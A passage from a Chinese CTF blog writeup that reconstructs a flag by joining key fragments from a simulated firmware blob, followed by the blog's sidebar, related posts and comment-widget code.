+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def _make_blob():</span><br><span class="line">    blob = b&quot;SQUASHFS_SIMULATED\n&quot;</span><br><span class="line">    blob += b&quot;---BEGIN /etc/config/master_key.conf---\n&quot;</span><br><span class="line">    # 提取到密钥的B部分</span><br><span class="line">    blob+=b&#x27;#MasterKeyPartB\nkey_part_b=&quot;neng_bu_neng&quot;\n&#x27; </span><br><span class="line">    blob += b&quot;---END /etc/config/master_key.conf---\n&quot;</span><br><span class="line">    blob += b&quot;---BEGIN /bin/open_sesame.sh---\n&quot;</span><br><span class="line">    # 提取到密钥的A部分和C部分，并进行拼接</span><br><span class="line">    blob+=b&#x27;#!/bin/sh\nPART_A=&quot;zhi_ma_&quot;\\nPART_C=&quot;_kai_men&quot;\\n./etc/config/master_key.conf\\nMASTER_KEY=&quot;$&#123;PART_A&#125;$&#123;key_part_b&#125;$&#123;PART_C&#125;&quot;\\necho &quot;The master key is: $MASTER_KEY&quot;\\n&#x27;</span><br><span class="line">    blob += b&quot;\n---END /bin/open_sesame.sh---\n&quot;</span><br><span class="line">    return blob</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>拼接最终口令：</li>
+</ol>
+<p>  根据 open_sesame.sh 脚本的拼接逻辑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MASTER_KEY=&quot;$&#123;PART_A&#125;$&#123;key_part_b&#125;$&#123;PART_C&#125;&quot;</span><br><span class="line">   PART_A = &quot;zhi_ma_&quot;</span><br><span class="line">   key_part_b = &quot;neng_bu_neng&quot;</span><br><span class="line">   PART_C = &quot;_kai_men&quot;</span><br></pre></td></tr></table></figure>
+
+<p>  将这三部分组合在一起，门锁最终验证的 MasterKey 就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zhi_ma_neng_bu_neng_kai_men</span><br></pre></td></tr></table></figure>
+
+<p>flag为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;zhi_ma_neng_bu_neng_kai_men&#125;</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://simple9656.github.io">joke</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://simple9656.github.io/2026/04/07/polarCTF-Writeup/">https://simple9656.github.io/2026/04/07/polarCTF-Writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://simple9656.github.io" target="_blank">joke的小世界</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/polarCTF/">polarCTF</a></div><div class="post-share"><div class="social-share" data-image="https://picsum.photos/1920/1080?random=3" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/02/12/SHCTF-misc%E6%96%B9%E5%90%91%E9%98%B6%E6%AE%B5%E4%B8%80wp/" title="SHCTF misc方向阶段一wp"><img class="cover" src="https://picsum.photos/1920/1080?random=2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">SHCTF misc方向阶段一wp</div></div><div class="info-2"><div class="info-item-1">SHCTF WP -NinaSec这次并没有花费很多时间去做这个题目，因为要过年了嘛，事情有点多，所以就把misc做了一做，写个wp,嘿嘿~   比赛网址：https://shc.tf/（复现平台暂时没找到） Misc-签到题目描述： 12扫码关注公众号，并发送：『马』上「赢」盛世山河即可获取本题flag  扫描公众号即可获得flag. flag为： 1SHCTF&#123;WiSh1ng_y0u_@_HaPpy_NEw_Ye@r_1n_Adv@nCe!&#125;  Misc-薇薇安的美照题目描述： 1学了一天化学的Zero，决定去打打绝区零里，flag格式：SHCTF&#123;**&#125;记得flag是大写的呢  打开附件的jpg文件用010 editor打开，看看文件尾后面： 1SHCTF&#123;MV84Xzc0XzIwXzdfOTJfMTZfNV8xOF84Xzc=&#125;  很明显的一段base64 1MV84Xzc0XzIwXzdfOTJfMTZfNV8xOF84Xzc=  解密一下： 11_8_74_20_7_92_16_5_18_8_7  结合题目所...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/01/05/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E8%A7%A3%E5%8E%8B%E8%84%9A%E6%9C%AC%EF%BC%88%E9%80%82%E5%90%88%E5%A5%97%E5%A8%83%E9%A2%98%EF%BC%89/" title="压缩包各种类型解压脚本（适合套娃题）"><img class="cover" src="https://picsum.photos/1920/1080?random=3" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-05</div><div class="info-item-2">压缩包各种类型解压脚本（适合套娃题）</div></div><div class="info-2"><div class="info-item-1">压缩包全解压脚本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184import osimport shutilimport zipfileimport t...</div></div></div></a><a class="pagination-related" href="/2026/02/09/furryCTF-2025-WP-from-NinaSec-%E5%92%8C%E5%B7%A5%E4%B8%80%E9%98%B5%E5%B8%88%E5%82%85%E4%B8%80%E8%B5%B7%E5%81%9A%E7%9A%84nwn/" title="furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)"><img class="cover" src="https://picsum.photos/1920/1080?random=3" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-09</div><div class="info-item-2">furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)</div></div><div class="info-2"><div class="info-item-1">furryCTF 2025 Writeup-NinaSec WP(和工一阵师傅一起做的，nwn)本次比赛解出来29题，燃尽了。（另外，感谢工一阵师傅的抢血奋斗zmz） 复现网址：https://furryctf.com/games/2/challenges 【Misc】签到题题目描述： 12345678本题flag头：furryCTF&#123;&#125;这里是今年的签到题~nwn不整太多花里胡哨的了，今年的签到题题目是一个投票：https://tp.wjx.top/vm/tUv4AXj.aspx#a？你说过期了？那不关我的事nwn，我已经把flag写在投票后的页面了，怎么拿是你的问题哦~时刻记得，flag的格式为furryCTF&#123;&#125;哦~因为这个题目太简单，所以初始分数只有100分，最高衰减20% zwz  【解题思路】 这题主要就是看源码，考验检索能力。 【解题步骤】   打开题目链接可以看到这个页面，点击查看结果依旧没有什么线索：   所以就直接ctrl+u看源码，按ctrl+f搜索furryCTF就可以看到flag:   flag为： 1furryCT...</div></div></div></a><a class="pagination-related" href="/2026/01/03/furryCTF%E7%83%AD%E8%BA%AB%E8%B5%9Bwp/" title="furryCTF热身赛wp"><img class="cover" src="https://picsum.photos/1920/1080?random=2" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-03</div><div class="info-item-2">furryCTF热身赛wp</div></div><div class="info-2"><div class="info-item-1">furryCTF2025赛前热身题（misc方向）比赛网站：https://furryctf.com/games/5 1.签到题题目描述： 123话说，你们有发现比赛平台上藏有一个flag吗？注意flag格式哦~  在赛题主页就可以找到：   flag为： 1furryCTF&#123;Hack_for_fun_not_for_profit&#125;  2.新的一年，新的开始题目描述： 1234567891011Catch The FutureTime to own 2025Forever young in hackingfurryCTF&#123;h4ppY_n3w_y34r_2o25_w1th_1Ov3&#125;祝各位师傅：栈上生花，堆里藏月，逆向不秃，web不坐牢，pwn穿一切，ak全场！ 🚩🎉  这种就是问卷题 flag为： 1furryCTF&#123;h4ppY_n3w_y34r_2o25_w1th_1Ov3&#125;  3.PassDump123456789作为CTFer，很多时候都会有电脑放一夜跑程序的经历。但猫猫看着跑一夜碰撞之后蓝屏的电脑，陷入了沉思...</div></div></div></a><a class="pagination-related" href="/2026/01/24/Web%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%95/" title="Web攻防世界入门题单"><img class="cover" src="https://picsum.photos/1920/1080?random=1" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-24</div><div class="info-item-2">Web攻防世界入门题单</div></div><div class="info-2"><div class="info-item-1">Web学习笔记 Writeup攻防世界入门题单：https://adworld.xctf.org.cn/challenges/problem-set-index?id=25 入门题单教程：https://www.bilibili.com/video/BV1rz4y137dF/（讲的非常通俗，爱了爱了） 1.view_source题目描述： 1X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。  本题要求就是看网页源代码，按F12，元素里就可以看到flag   flag为： 1cyberpeace&#123;34c612f0278f14ab46733186fa21d41f&#125;   2.get_post题目描述： 1X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？  通过上网查询，得知： HTTP协议中最常用的两种请求方法是GET和POST。  GET：用于从服务器获取数据，参数通过URL传递（如/test?name=value），适合非敏感信息的查询，但数据长度受URL限制。 POST：用于向服务器提交数据，参数放在请求体中（如表单...</div></div></div></a><a class="pagination-related" href="/2026/02/12/SHCTF-misc%E6%96%B9%E5%90%91%E9%98%B6%E6%AE%B5%E4%B8%80wp/" title="SHCTF misc方向阶段一wp"><img class="cover" src="https://picsum.photos/1920/1080?random=2" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-12</div><div class="info-item-2">SHCTF misc方向阶段一wp</div></div><div class="info-2"><div class="info-item-1">SHCTF WP -NinaSec这次并没有花费很多时间去做这个题目，因为要过年了嘛，事情有点多，所以就把misc做了一做，写个wp,嘿嘿~   比赛网址：https://shc.tf/（复现平台暂时没找到） Misc-签到题目描述： 12扫码关注公众号，并发送：『马』上「赢」盛世山河即可获取本题flag  扫描公众号即可获得flag. flag为： 1SHCTF&#123;WiSh1ng_y0u_@_HaPpy_NEw_Ye@r_1n_Adv@nCe!&#125;  Misc-薇薇安的美照题目描述： 1学了一天化学的Zero，决定去打打绝区零里，flag格式：SHCTF&#123;**&#125;记得flag是大写的呢  打开附件的jpg文件用010 editor打开，看看文件尾后面： 1SHCTF&#123;MV84Xzc0XzIwXzdfOTJfMTZfNV8xOF84Xzc=&#125;  很明显的一段base64 1MV84Xzc0XzIwXzdfOTJfMTZfNV8xOF84Xzc=  解密一下： 11_8_74_20_7_92_16_5_18_8_7  结合题目所...</div></div></div></a><a class="pagination-related" href="/2026/01/28/XCTF-LilacCTF-2026-Writeup/" title="XCTF-LilacCTF 2026-Writeup"><img class="cover" src="https://picsum.photos/1920/1080?random=1" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-28</div><div class="info-item-2">XCTF-LilacCTF 2026-Writeup</div></div><div class="info-2"><div class="info-item-1">XCTF-LilacCTF 2026-Writeup官方题目网址：https://adworld.xctf.org.cn/match/guide?event_hash=7b528ca2-f4da-11f0-bf63-000c297261bb 这次就做出来5题(比一开始只会签到要好)，以自己的拙见写一份wp 1.MISC-Welcome签到题 题目描述： 1789c0540b10980400c5ce92442067849153bc1f278ae1031ad95b87bc8bba6c611df6925ec46076bc955f2e0056ccc773c7f03fb580c81  这是一个十六进制字符串（hex）最后肯定要转成ASCII码：这里介绍两种做法，一种是用脚本就是下面这种做法： 12345import binascii, zlibhexdata = &quot;789c0540b10980400c5ce92442067849153bc1f278ae1031ad95b87bc8bba6c611df6925ec46076bc955f2e0056ccc773c7f03fb580c8...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">joke</div><div class="author-info-description">我希望你多笑笑</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/simple9656"><i class="fab fa-github"></i><span>click me</span></a><div class="card-info-social-icons"><a class="social-icon" href="/h" target="_blank" title=""><i></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="1"></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="2"></i></a><a class="social-icon" href="/p" target="_blank" title=""><i class="3"></i></a><a class="social-icon" href="/s" target="_blank" title=""><i class="4"></i></a><a class="social-icon" href="/:" target="_blank" title=""><i class="5"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="6"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="7"></i></a><a class="social-icon" href="/g" target="_blank" title=""><i class="8"></i></a><a class="social-icon" href="/i" target="_blank" title=""><i class="9"></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="10"></i></a><a class="social-icon" href="/h" target="_blank" title=""><i class="11"></i></a><a class="social-icon" href="/u" target="_blank" title=""><i class="12"></i></a><a class="social-icon" href="/b" target="_blank" title=""><i class="13"></i></a><a class="social-icon" href="/." target="_blank" title=""><i class="14"></i></a><a class="social-icon" href="/c" target="_blank" title=""><i class="15"></i></a><a class="social-icon" href="/o" target="_blank" title=""><i class="16"></i></a><a class="social-icon" href="/m" target="_blank" title=""><i class="17"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="18"></i></a><a class="social-icon" href="/s" target="_blank" title=""><i class="19"></i></a><a class="social-icon" href="/i" target="_blank" title=""><i class="20"></i></a><a class="social-icon" href="/m" target="_blank" title=""><i class="21"></i></a><a class="social-icon" href="/p" target="_blank" title=""><i class="22"></i></a><a class="social-icon" href="/l" target="_blank" title=""><i class="23"></i></a><a class="social-icon" href="/e" target="_blank" title=""><i class="24"></i></a><a class="social-icon" href="/9" target="_blank" title=""><i class="25"></i></a><a class="social-icon" href="/6" target="_blank" title=""><i class="26"></i></a><a class="social-icon" href="/5" target="_blank" title=""><i class="27"></i></a><a class="social-icon" href="/6" target="_blank" title=""><i class="28"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="29"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="30"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="31"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="32"></i></a><a class="social-icon" href="/G" target="_blank" title=""><i class="33"></i></a><a class="social-icon" href="/i" target="_blank" title=""><i class="34"></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="35"></i></a><a class="social-icon" href="/h" target="_blank" title=""><i class="36"></i></a><a class="social-icon" href="/u" target="_blank" title=""><i class="37"></i></a><a class="social-icon" href="/b" target="_blank" title=""><i class="38"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="39"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="40"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="41"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="42"></i></a><a class="social-icon" href="/'" target="_blank" title=""><i class="43"></i></a><a class="social-icon" href="#" target="_blank" title=""><i class="44"></i></a><a class="social-icon" href="/2" target="_blank" title=""><i class="45"></i></a><a class="social-icon" href="/4" target="_blank" title=""><i class="46"></i></a><a class="social-icon" href="/2" target="_blank" title=""><i class="47"></i></a><a class="social-icon" href="/9" target="_blank" title=""><i class="48"></i></a><a class="social-icon" href="/2" target="_blank" title=""><i class="49"></i></a><a class="social-icon" href="/e" target="_blank" title=""><i class="50"></i></a><a class="social-icon" href="/'" target="_blank" title=""><i class="51"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">你是我生命里的意外惊喜，不需要言语，却能治愈我所有的疲惫。每一次低落，都是因为你，我才重新找到力量。你是我不曾预料的温暖，直接击中心脏。你，是我的全世界。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PolarCTF-Writeup"><span class="toc-number">1.</span> <span class="toc-text">PolarCTF Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BA%A6%E5%A1%AB"><span class="toc-number">1.1.1.</span> <span class="toc-text">麦填</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#time"><span class="toc-number">1.1.2.</span> <span class="toc-text">time</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PNG%E5%A4%B4%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">1.1.3.</span> <span class="toc-text">PNG头的秘密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E9%B9%B0%E6%8D%89%E5%B0%8F%E9%B8%A1"><span class="toc-number">1.1.4.</span> <span class="toc-text">老鹰捉小鸡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81"><span class="toc-number">1.1.5.</span> <span class="toc-text">隐藏的二维码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sis-puella-magic%EF%BC%81"><span class="toc-number">1.1.6.</span> <span class="toc-text">Sis puella magic！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attack-log"><span class="toc-number">1.1.7.</span> <span class="toc-text">attack_log</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BE%E4%B8%87%E8%B5%8F%E9%87%91"><span class="toc-number">1.2.1.</span> <span class="toc-text">百万赏金</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%9A%E5%A3%AB%E7%9A%84%E5%AE%9E%E9%AA%8C%E6%95%B0%E6%8D%AE"><span class="toc-number">1.2.2.</span> <span class="toc-text">博士的实验数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RC4%E7%9A%84%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.3.</span> <span class="toc-text">RC4的密钥泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E5%8E%9F%E4%B8%8A%E7%9A%84OTA%E8%B0%9C%E9%A2%98"><span class="toc-number">1.2.4.</span> <span class="toc-text">冰原上的OTA谜题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AAASR"><span class="toc-number">1.2.5.</span> <span class="toc-text">伪ASR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ECC%E7%9A%84%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.6.</span> <span class="toc-text">ECC的攻击模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Signed-Too-Weak"><span class="toc-number">1.3.1.</span> <span class="toc-text">Signed_Too_Weak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#coke%E7%9A%84%E7%B2%89%E4%B8%9D%E5%9B%A2"><span class="toc-number">1.3.2.</span> <span class="toc-text">coke的粉丝团</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E5%B9%B4%E8%B4%BA%E5%8D%A1"><span class="toc-number">1.3.3.</span> <span class="toc-text">新年贺卡</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-number">1.4.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A02"><span class="toc-number">1.4.1.</span> <span class="toc-text">练习2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PloTS"><span class="toc-number">1.5.</span> <span class="toc-text">PloTS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bllhl-xmpp"><span class="toc-number">1.5.1.</span> <span class="toc-text">bllhl_xmpp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#polarble"><span class="toc-number">1.5.2.</span> <span class="toc-text">polarble</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%B9%A0%E7%94%9Fflashrom"><span class="toc-number">1.5.3.</span> <span class="toc-text">实习生flashrom</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/04/07/polarCTF-Writeup/" title="polarCTF Writeup"><img src="https://picsum.photos/1920/1080?random=3" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="polarCTF Writeup"/></a><div class="content"><a class="title" href="/2026/04/07/polarCTF-Writeup/" title="polarCTF Writeup">polarCTF Writeup</a><time datetime="2026-04-07T00:27:53.000Z" title="发表于 2026-04-07 08:27:53">2026-04-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/12/SHCTF-misc%E6%96%B9%E5%90%91%E9%98%B6%E6%AE%B5%E4%B8%80wp/" title="SHCTF misc方向阶段一wp"><img src="https://picsum.photos/1920/1080?random=2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SHCTF misc方向阶段一wp"/></a><div class="content"><a class="title" href="/2026/02/12/SHCTF-misc%E6%96%B9%E5%90%91%E9%98%B6%E6%AE%B5%E4%B8%80wp/" title="SHCTF misc方向阶段一wp">SHCTF misc方向阶段一wp</a><time datetime="2026-02-12T14:45:20.000Z" title="发表于 2026-02-12 22:45:20">2026-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/09/furryCTF-2025-WP-from-NinaSec-%E5%92%8C%E5%B7%A5%E4%B8%80%E9%98%B5%E5%B8%88%E5%82%85%E4%B8%80%E8%B5%B7%E5%81%9A%E7%9A%84nwn/" title="furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)"><img src="https://picsum.photos/1920/1080?random=3" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)"/></a><div class="content"><a class="title" href="/2026/02/09/furryCTF-2025-WP-from-NinaSec-%E5%92%8C%E5%B7%A5%E4%B8%80%E9%98%B5%E5%B8%88%E5%82%85%E4%B8%80%E8%B5%B7%E5%81%9A%E7%9A%84nwn/" title="furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)">furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)</a><time datetime="2026-02-09T13:08:06.000Z" title="发表于 2026-02-09 21:08:06">2026-02-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/28/XCTF-LilacCTF-2026-Writeup/" title="XCTF-LilacCTF 2026-Writeup"><img src="https://picsum.photos/1920/1080?random=1" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XCTF-LilacCTF 2026-Writeup"/></a><div class="content"><a class="title" href="/2026/01/28/XCTF-LilacCTF-2026-Writeup/" title="XCTF-LilacCTF 2026-Writeup">XCTF-LilacCTF 2026-Writeup</a><time datetime="2026-01-28T04:37:32.000Z" title="发表于 2026-01-28 12:37:32">2026-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/Web%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%95/" title="Web攻防世界入门题单"><img src="https://picsum.photos/1920/1080?random=1" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web攻防世界入门题单"/></a><div class="content"><a class="title" href="/2026/01/24/Web%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%95/" title="Web攻防世界入门题单">Web攻防世界入门题单</a><time datetime="2026-01-23T16:27:53.000Z" title="发表于 2026-01-24 00:27:53">2026-01-24</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By joke</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div><div class="footer_custom_text">你和我的一切有关</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://jokeblogcomments.vercel.app',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = (el = document, path = location.pathname) => {
+    twikoo.init({
+      el: el.querySelector('#twikoo-wrap'),
+      envId: 'https://jokeblogcomments.vercel.app',
+      region: '',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      },
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    
+
+    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
+      if (el.children.length) {
+        el.innerHTML = ''
+        el.classList.add('no-comment')
+      }
+    })
+  }
+
+  const loadTwikoo = (el, path) => {
+    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
+    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo@1.6.44/dist/twikoo.all.min.js').then(() => init(el, path))
+  }
+
+  if (isShuoshuo) {
+    'Twikoo' === 'Twikoo'
+      ? window.shuoshuoComment = { loadComment: loadTwikoo }
+      : window.loadOtherComment = loadTwikoo
+    return
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script src="/js/random_bg.js"></script><script src="/js/sakura.js"></script><script src="/js/music_card.js"></script><script src="/js/runtime.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
